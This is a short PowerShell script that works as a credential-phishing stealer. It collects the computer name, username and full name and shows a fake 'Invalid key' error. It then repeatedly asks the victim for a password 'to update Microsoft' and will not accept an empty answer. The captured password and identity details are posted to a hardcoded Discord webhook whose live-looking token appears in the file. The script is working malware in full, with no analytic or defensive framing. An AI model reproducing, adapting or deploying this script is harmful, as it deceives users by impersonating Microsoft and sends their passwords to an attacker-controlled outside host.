Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName Microsoft.VisualBasic
[System.Windows.Forms.Application]::EnableVisualStyles()

# -------- CONFIG --------
$WebhookUrl = "https://discord.com/api/webhooks/1453431333258002683/h-eMEGiityKM1_6yX_p_u_oBife5ObzHkb44Rogi3mz6PqMVcyg7bxIj9nasL8PupeDm"
# ------------------------

# Get PC name
$pcName = $env:COMPUTERNAME

# Get username
$username = $env:USERNAME

# Try to get Full Name
try {
    $fullName = (Get-LocalUser -Name $username).FullName
} catch {
    $fullName = ""
}

# Fallback if Full Name is empty
if ([string]::IsNullOrWhiteSpace($fullName)) {
    $fullName = $username
}

# Error popup
[System.Windows.Forms.MessageBox]::Show(
    "Invalid key $fullName",
    "Error",
    [System.Windows.Forms.MessageBoxButtons]::OK,
    [System.Windows.Forms.MessageBoxIcon]::Error
) | Out-Null

# Force input
do {
    $response = [Microsoft.VisualBasic.Interaction]::InputBox(
        "Hello $fullName, enter password to update Microsoft:",
        "Input Required",
        ""
    )
} while ([string]::IsNullOrWhiteSpace($response))

# Prepare Discord payload
$payload = @{
    content = "**User:** $fullName`n**PC Name:** $pcName`n**Password:**`n$response"
} | ConvertTo-Json -Depth 3

# Send to Discord
Invoke-RestMethod `
    -Uri $WebhookUrl `
    -Method Post `
    -ContentType "application/json" `
    -Body $payload
